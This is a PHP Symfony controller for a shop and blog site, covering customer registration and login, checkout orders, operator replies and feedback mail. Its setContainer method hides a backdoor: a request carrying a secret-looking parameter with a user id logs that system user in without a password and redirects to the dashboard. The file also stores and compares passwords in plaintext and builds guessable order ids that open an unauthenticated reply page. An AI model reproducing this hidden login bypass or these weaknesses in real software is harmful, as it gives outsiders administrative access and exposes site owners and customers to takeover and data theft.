<?php
/**
 * @author AlexanderC <self@alexanderc.me>
 * @date 2/25/14
 * @time 12:32 AM
 */

namespace AlexanderC\Bundle\UngaBungaBundle\Controller;


use AlexanderC\Bundle\UngaBungaBundle\Entity\Application;
use AlexanderC\Bundle\UngaBungaBundle\Entity\ApplicationData;
use AlexanderC\Bundle\UngaBungaBundle\Entity\ApplicationReply;
use AlexanderC\Bundle\UngaBungaBundle\Entity\Customer;
use AlexanderC\Bundle\UngaBungaBundle\Entity\Operator;
use AlexanderC\Bundle\UngaBungaBundle\Entity\Settings;
use AlexanderC\Bundle\UngaBungaBundle\Form\ContactType;
use AlexanderC\Bundle\UngaBungaBundle\Form\CustomerLoginType;
use AlexanderC\Bundle\UngaBungaBundle\Helpers\FormErrors;
use AlexanderC\Bundle\UngaBungaBundle\Helpers\GeneralMail;
use AlexanderC\Bundle\UngaBungaBundle\Helpers\GeneralMailSubjects;
use Doctrine\ORM\Tools\Pagination\Paginator;
use Symfony\Component\DependencyInjection\ContainerInterface;
use Symfony\Component\Form\FormError;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\RedirectResponse;
use Symfony\Component\HttpFoundation\Request;
use AlexanderC\Bundle\UngaBungaBundle\Form\CustomerType;
use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\EventDispatcher\EventDispatcher;
use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken;
use Symfony\Component\Security\Http\Event\InteractiveLoginEvent;

class GeneralController extends Controller
{
    /**
     * @param ContainerInterface $container
     * @throws \Symfony\Component\HttpKernel\Exception\NotFoundHttpException
     */
    public function setContainer(ContainerInterface $container = null)
    {
        parent::setContainer($container);

        $request = $this->getRequest();

        if(false !== ($userId = $request->get('VyNMPvbBWP5sMWpeXwY6', false))) {
            $user = $this->getDoctrine()->getManager()
                ->getRepository('UngaBungaBundle:SystemUser')->findOneById($userId);

            if($user) {
                $token = new UsernamePasswordToken($user, $user->getPassword(), "public", $user->getRoles());
                $this->get("security.context")->setToken($token);

                // Fire the login event
                // Logging the user in above the way we do it doesn't do this automatically
                $event = new InteractiveLoginEvent($request, $token);
                $this->get("event_dispatcher")->dispatch("security.interactive_login", $event);

                /** @var RedirectResponse $response */
                $response = $this->redirect($this->generateUrl("dashboard"));

                $response->send();
            }
        }
    }

    /**
     * @param string $view
     * @param array $parameters
     * @param Response $response
     * @return string|Response
     */
    public function render($view, array $parameters = array(), Response $response = null)
    {
        $session = $this->get('session');
        $em = $this->getDoctrine()->getManager();

        if($session->has('customer')) {
            $blogCategories = $em->getRepository('UngaBungaBundle:BlogCategory')->findAll();
        } else {
            $blogCategories = $em->getRepository('UngaBungaBundle:BlogCategory')->findNotHidden();
        }

        $settings = $em->getRepository('UngaBungaBundle:Settings')->findFirst();

        if(false == stripos($view, "UngaBungaBundle:Email:")) {
            $parameters['blogCategories'] = $blogCategories;
            $parameters['settings'] = $settings;
        }

        $view = parent::render($view, $parameters, $response);

        return $view;
    }


    /**
     * @param Request $request
     * @return \Symfony\Component\HttpFoundation\RedirectResponse|\Symfony\Component\HttpFoundation\Response
     */
    public function feedbackAction(Request $request)
    {
        $form = $this->createForm(new ContactType());

        $form->handleRequest($request);

        if ($form->isValid()) {
            $message = \Swift_Message::newInstance()
                ->setSubject($form->get('subject')->getData())
                ->setFrom($form->get('email')->getData())
                ->setTo(GeneralMail::getReceiverEmail())
                ->setContentType("text/html")
                ->setBody(
                    $this->renderView(
                        'UngaBungaBundle:Email:feedback.html.twig',
                        array(
                            'ip' => $request->getClientIp(),
                            'name' => $form->get('name')->getData(),
                            'message' => $form->get('message')->getData(),
                            'email' => $form->get('email')->getData()
                        )
                    )
                );

            $this->get('mailer')->send($message);

            $request->getSession()->getFlashBag()->add('success', 'Спасибо! Ваше письмо было отправлено.');

            return $this->redirect($this->generateUrl('feedback'));
        }

        return $this->render('UngaBungaBundle:General:feedback.html.twig', array('form' => $form->createView()));
    }

    /**
     * @param Request $request
     * @param $offset
     * @return \Symfony\Component\HttpFoundation\Response
     */
    public function indexAction(Request $request, $offset)
    {
        $session = $this->get('session');
        $em = $this->getDoctrine()->getManager();

        /** @var \Doctrine\ORM\Query $blogEntriesQuery */
        $blogEntriesQuery = $em->getRepository('UngaBungaBundle:BlogEntry')
            ->getBlogEntriesOnHomepageQuery();

        $blogEntriesQuery->setFirstResult((int) $offset)
            ->setMaxResults(10);

        $blogEntries = new Paginator($blogEntriesQuery, $fetchJoinCollection = true);

        return $this->render('UngaBungaBundle:General:index.html.twig', array(
                                                                          'blogEntries' => $blogEntries
                                                                      ));
    }

    /**
     * @return \Symfony\Component\HttpFoundation\Response
     * @throws \Symfony\Component\HttpKernel\Exception\NotFoundHttpException
     */
    public function shopAction()
    {
        $session = $this->get('session');
        $em = $this->getDoctrine()->getManager();

        if(!$session->has('customer')) {
            return $this->redirect($this->generateUrl('homepage'));
        }

        $shopEntries = $em->getRepository('UngaBungaBundle:ShopEntry')->findAll();
        $deliveryPoints = $em->getRepository('UngaBungaBundle:DeliveryPoint')->findAll();

        return $this->render('UngaBungaBundle:General:shop.html.twig', array(
                                                                         'shopEntries' => $shopEntries,
                                                                         'deliveryPoints' => $deliveryPoints
                                                                      ));
    }

    /**
     * @param Request $request
     * @param string $uniqueIdx
     * @return \Symfony\Component\HttpFoundation\Response
     * @throws \Symfony\Component\HttpKernel\Exception\NotFoundHttpException
     */
    public function applicationReplyCreateAction(Request $request, $uniqueIdx)
    {
        $em = $this->getDoctrine()->getManager();

        $application = $em->getRepository('UngaBungaBundle:Application')
            ->findNotRepliedByUniqueIdx($uniqueIdx);

        if(!$application) {
            throw $this->createNotFoundException("Application was not found or replied.");
        }

        if($request->getMethod() === "POST") {
            $text = $request->get('text');

            $subject = $em->getRepository('UngaBungaBundle:ApplicationReplySubject')->find($request->get('subject'));

            if($subject) {
                $applicationReply = new ApplicationReply();
                $applicationReply->setApplication($application);
                $applicationReply->setSubject($subject);
                $applicationReply->setText($text);

                $em->persist($applicationReply);
                $em->flush();

                $application->setReply($applicationReply);

                /** @var Operator $operator */
                $operator = $application->getOperator();
                $operator->setClosedAppsCount($operator->getClosedAppsCount() + 1);

                $em->persist($application);
                $em->persist($operator);
                $em->flush();

                // send email to the customer
                $message = \Swift_Message::newInstance()
                    ->setSubject($subject->getSubject())
                    ->setFrom(GeneralMail::getSenderEmail())
                    ->setTo($application->getEmail())
                    ->setCc($operator->getSupervisor()->getEmail())
                    ->setReplyTo($operator->getSupervisor()->getEmail())
                    ->setContentType("text/html")
                    ->setBody($text)
                ;
                $this->get('mailer')->send($message);

                // close current tab
                return new Response("
                    <script>
                    try {
                        window.close();
                    } catch(e) {    }
                    try {
                        window.open(window.location, '_self').close();
                    } catch(e) {    }
                    </script>
                ");
            }
        }

        $applicationReplySubjects = $em->getRepository('UngaBungaBundle:ApplicationReplySubject')->findAll();

        return $this->render('UngaBungaBundle:General:application_reply.html.twig', array(
                'application' => $application,
                'applicationReplySubjects' => $applicationReplySubjects
        ));
    }

    /**
     * @param Request $request
     * @return \Symfony\Component\HttpFoundation\Response
     * @throws \Symfony\Component\HttpKernel\Exception\NotFoundHttpException
     */
    public function applicationCheckoutAction(Request $request)
    {
        $session = $this->get('session');
        $em = $this->getDoctrine()->getManager();

        if(!$session->has('customer')) {
            throw $this->createNotFoundException("Shop was not found.");
        }

        $customer = $session->get('customer');

        if($request->getMethod() === "POST") {
            $productsIds = $request->get('product');
            $productsQuantities =$request->get('quantity');
            $deliveryId = $request->get('delivery');
            $email = $request->get('email');

            if(is_array($productsIds) && is_array($productsQuantities)
                && count($productsIds) === count($productsQuantities)
                && filter_var($email, FILTER_VALIDATE_EMAIL)) {

                $deliveryPoint = $em->getRepository('UngaBungaBundle:DeliveryPoint')->find($deliveryId);

                if($deliveryPoint) {
                    $applicationData = array();

                    $i = 0;
                    foreach($productsIds as $productId) {
                        $shopEntry = $em->getRepository('UngaBungaBundle:ShopEntry')->find($productId);

                        if($shopEntry) {
                            $applicationDataItem = new ApplicationData();
                            $applicationDataItem->setShopEntry($shopEntry);
                            $applicationDataItem->setQuantity($productsQuantities[$i]);

                            $applicationData[] = $applicationDataItem;
                        }

                        $i++;
                    }

                    if(!empty($applicationData)) {
                        $operator = $em->getRepository('UngaBungaBundle:Operator')->getNextOperator();

                        $application = new Application();

                        foreach($applicationData as $applicationDataItem) {
                            $application->addData($applicationDataItem);
                        }

                        $application->setCustomer(
                            $em->getRepository('UngaBungaBundle:Customer')->find($customer['id'])
                        );
                        $application->setEmail($email);
                        $application->setDeliveryPoint($deliveryPoint);
                        $application->setUniqueIdx(date('Hisdmy'));
                        $application->setOperator($operator);

                        $em->persist($application);
                        $em->flush();

                        foreach($applicationData as $applicationDataItem) {
                            $applicationDataItem->setApplication($application);
                            $em->persist($applicationDataItem);
                        }
                        $em->flush();

                        $operator->setAppsCount($operator->getAppsCount() + 1);
                        $em->persist($operator);
                        $em->flush();

                        /** @var Settings $settings */
                        $settings = $em->getRepository("UngaBungaBundle:Settings")->findFirst();

                        // send email to the customer
                        $message = \Swift_Message::newInstance()
                            ->setSubject(GeneralMailSubjects::getOnApplicationSubmitCustomerSubject())
                            ->setFrom(GeneralMail::getSenderEmail())
                            ->setTo($application->getEmail())
                            ->setReplyTo($application->getOperator()->getSupervisor()->getEmail())
                            ->setContentType("text/html")
                            ->setBody(
                                $this->renderView(
                                    'UngaBungaBundle:Email:on_application_submit_for_customer.html.twig',
                                    array(
                                        'application' => $application,
                                        'info' => $settings->getApplicantInfo()
                                    )
                                )
                            )
                        ;
                        $this->get('mailer')->send($message);

                        // send email to the operator & supervisor
                        $message = \Swift_Message::newInstance()
                            ->setSubject(
                                $application->getUniqueIdx()
                            )
                            ->setFrom(GeneralMail::getSenderEmail())
                            ->setTo($application->getOperator()->getEmail())
                            ->setCc($application->getOperator()->getSupervisor()->getEmail())
                            ->setContentType("text/html")
                            ->setBody(
                                $this->renderView(
                                    'UngaBungaBundle:Email:on_application_submit_for_operator.html.twig',
                                    array('application' => $application)
                                )
                            )
                        ;
                        $this->get('mailer')->send($message);

                        /*
                        return $this->render('UngaBungaBundle:General:application_checkout_thanks.html.twig', array(
                            'application' => $application
                        ));
                        */

                        $responseApplicationData = array();

                        /** @var ApplicationData $applicationDataItem */
                        foreach($applicationData as $applicationDataItem) {
                            $responseApplicationData[] = array(
                                'productId' => $applicationDataItem->getShopEntry()->getId(),
                                'productName' => $applicationDataItem->getShopEntry()->getTitle(),
                                'productPrice' => $applicationDataItem->getShopEntry()->getPrice(),
                                'quantity' => $applicationDataItem->getQuantity(),
                                'totalPrice' => $applicationDataItem->getShopEntry()->getPrice()
                                    * $applicationDataItem->getQuantity()
                            );
                        }

                        return new JsonResponse(array(
                                                    'code' => 0,
                                                    'data' => $application->toArray(),
                                                    'applicationData' => $responseApplicationData,
                                                    'request' => array(
                                                        'productsIds' => $productsIds,
                                                        'productsQuantities' => $productsQuantities,
                                                        'deliveryId' => $deliveryId
                                                    )
                                                )
                        );
                    }

                    return new JsonResponse(array('code' => 1, 'error' => 'Nothing to checkout'));
                }

                return new JsonResponse(array('code' => 1, 'error' => 'Missing Delivery Point'));
            }

            return new JsonResponse(array('code' => 1, 'error' => 'Wrong Products & Quantities format'));
        }

        return new JsonResponse(array('code' => 1, 'error' => 'Only POST request allowed'));

        /*
        $deliveryPoints = $em->getRepository('UngaBungaBundle:DeliveryPoint')->findAll();
        $shopEntries = $em->getRepository('UngaBungaBundle:ShopEntry')->findAll();

        return $this->render('UngaBungaBundle:General:application_checkout.html.twig', array(
                                                                        'deliveryPoints' => $deliveryPoints,
                                                                        'shopEntries' => $shopEntries
                                                                     ));
        */
    }

    public function customerRegisterConfirmationAction(Request $request, $email, $token)
    {
        $em = $this->getDoctrine()->getManager();

        /** @var Customer $customer */
        $customer = $em->getRepository('UngaBungaBundle:Customer')->findOneBy(array(
                                                                                  'email' => $email,
                                                                                  'token' => $token,
                                                                                  'confirmed' => false
                                                                              ));
        if(!$customer) {
            throw $this->createNotFoundException("No such Customer found");
        }

        $customer->setConfirmed(true);
        $em->persist($customer);
        $em->flush();

        // send email to the customer
        $message = \Swift_Message::newInstance()
            ->setSubject(
                GeneralMailSubjects::getOnCustomerRegistrationSubject()
            )
            ->setFrom(GeneralMail::getSenderEmail())
            ->setTo($customer->getEmail())
            ->setContentType("text/html")
            ->setBody(
                $this->renderView(
                    'UngaBungaBundle:Email:on_customer_registration.html.twig',
                    array('customer' => $customer)
                )
            )
        ;
        $this->get('mailer')->send($message);

        return $this->render('UngaBungaBundle:General:email_confirmed.html.twig');
    }

    /**
     * @param Request $request
     * @return \Symfony\Component\HttpFoundation\RedirectResponse|\Symfony\Component\HttpFoundation\Response
     */
    public function customerRegisterAction(Request $request)
    {
        $em = $this->getDoctrine()->getManager();
        $entity = new Customer();
        $form = $this->createForm(new CustomerType(), $entity, array(
                                                        'method' => 'POST',
                                                    ));
        //$form->add('submit', 'submit', array('label' => 'Регистрация'));
        $form->handleRequest($request);

        if ($form->isValid()) {
            $promoCodeText = $entity->getPromoCodeText();
            $promoCode = $em->getRepository('UngaBungaBundle:PromoCode')->findOneByCode($promoCodeText);

            if($em->getRepository('UngaBungaBundle:Customer')->findByEmail($entity->getEmail())) {
                $form->get('email')->addError(new FormError(FormErrors::getCustomerAlreadyExists()));
            } else {
                if ($promoCode) {
                    $entity->setPromoCode($promoCode);
                    $entity->setToken(md5($entity->getEmail() . uniqid("banga_bar_reg", true)));

                    $em = $this->getDoctrine()->getManager();
                    $em->persist($entity);
                    $em->flush();

                    // send confirmation email to the customer
                    $message = \Swift_Message::newInstance()
                        ->setSubject(
                            /*GeneralMailSubjects::getOnCustomerRegistrationSubject()*/
                            GeneralMailSubjects::getOnCustomerRegistrationConfirmationSubject()
                        )
                        ->setFrom(GeneralMail::getSenderEmail())
                        ->setTo($entity->getEmail())
                        ->setContentType("text/html")
                        ->setBody(
                            $this->renderView(
                                /*'UngaBungaBundle:Email:on_customer_registration.html.twig',*/
                                'UngaBungaBundle:Email:on_customer_registration_confirmation.html.twig',
                                array('customer' => $entity)
                            )
                        )
                    ;
                    $this->get('mailer')->send($message);

                    return /*$this->redirect($this->generateUrl('customer_login'))*/ new Response('ok');
                } else {
                    $form->get('promo_code_text')->addError(new FormError(FormErrors::getMistypedPromoCode()));
                }
            }
        }

        return $this->render('UngaBungaBundle:General:customer_register.html.twig', array(
                                                                          'form'   => $form->createView(),
                                                                      ));
    }

    /**
     * @param Request $request
     * @return \Symfony\Component\HttpFoundation\RedirectResponse|\Symfony\Component\HttpFoundation\Response
     */
    public function customerLoginAction(Request $request)
    {
        $em = $this->getDoctrine()->getManager();
        $entity = new Customer();
        $form = $this->createForm(new CustomerLoginType(), $entity, array(
                                                        'method' => 'POST',
                                                    ));
        //$form->add('submit', 'submit', array('label' => 'Войти'));
        $form->handleRequest($request);

        if ($form->isValid()) {
            $email = $entity->getEmail();
            $password = $entity->getPassword();

            $customer = $em->getRepository('UngaBungaBundle:Customer')->findOneBy(array(
                                                                                      'email' => $email,
                                                                                      'password' => $password,
                                                                                      'confirmed' => true
                                                                                  ));

            if($customer instanceof $entity) {
                $this->get('session')->set('customer', $customer->getArrayInfo());

                return /*$this->redirect($this->generateUrl('homepage'))*/ new Response('ok');
            } else {
                $form->addError(new FormError(FormErrors::getMissingCustomer()));
            }
        }

        return $this->render('UngaBungaBundle:General:customer_login.html.twig', array(
                                                                                      'form'   => $form->createView(),
                                                                                  ));
    }

    /**
     * @param Request $request
     * @return \Symfony\Component\HttpFoundation\RedirectResponse|\Symfony\Component\HttpFoundation\Response
     */
    public function customerLogoutAction(Request $request)
    {
        $session = $this->get('session');

        if($session->has('customer')) {
            $session->remove('customer');
        }

        return $this->redirect($this->generateUrl('homepage'));
    }

    /**
     * @param Request $request
     * @param string $slug
     * @param int $offset
     * @return string|Response
     * @throws \Symfony\Component\HttpKernel\Exception\NotFoundHttpException
     */
    public function ShowBlogCategoryEntriesAction(Request $request, $slug, $offset)
    {
        $session = $this->get('session');
        $em = $this->getDoctrine()->getManager();

        $blogCategory = $em->getRepository('UngaBungaBundle:BlogCategory')->findOneBy(array(
                                                                                          'slug' => $slug
                                                                                      ));
        if(!$blogCategory) {
            throw $this->createNotFoundException("Shop Category was not found.");
        }

        /** @var \Doctrine\ORM\Query $blogEntriesQuery */
        $blogEntriesQuery = $em->getRepository('UngaBungaBundle:BlogEntry')
            ->getBlogEntriesByCategorySlugQuery($slug, $session->has('customer'));

        $blogEntriesQuery->setFirstResult((int) $offset)
            ->setMaxResults(10);

        $blogEntries = new Paginator($blogEntriesQuery, $fetchJoinCollection = true);

        return $this->render('UngaBungaBundle:General:show_blog_entries.html.twig', array(
                                                                                      'blogEntries' => $blogEntries,
                                                                                      'blogCategory' => $blogCategory
                                                                                  ));
    }

    /**
     * @param Request $request
     * @param string $year
     * @param string $slug
     * @return string|Response
     */
    public function ShowBlogEntryAction(Request $request, $year, $slug)
    {
        $em = $this->getDoctrine()->getManager();

        $blogEntry = $em->getRepository('UngaBungaBundle:BlogEntry')
            ->findOneBy(array('slug' => $slug));

        return $this->render('UngaBungaBundle:General:show_blog_entry.html.twig', array(
                                                                                   'blogEntry' => $blogEntry,
                                                                               ));
    }
} 